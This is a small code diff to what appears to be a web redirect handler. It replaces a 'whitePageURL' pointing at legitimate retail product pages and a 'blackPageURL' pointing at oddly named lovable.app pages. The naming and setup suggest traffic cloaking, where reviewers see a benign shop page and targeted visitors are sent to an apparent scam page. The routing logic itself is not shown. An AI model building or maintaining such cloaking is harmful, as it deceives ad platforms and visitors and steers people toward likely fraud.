@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.colettehayman.com.au/collections/new/products/ashley-blue-denim-shoulder-bag-649264";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://www.stateofescape.com/collections/best-sellers/products/escape-tote-in-stone?variant=29376270237805";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
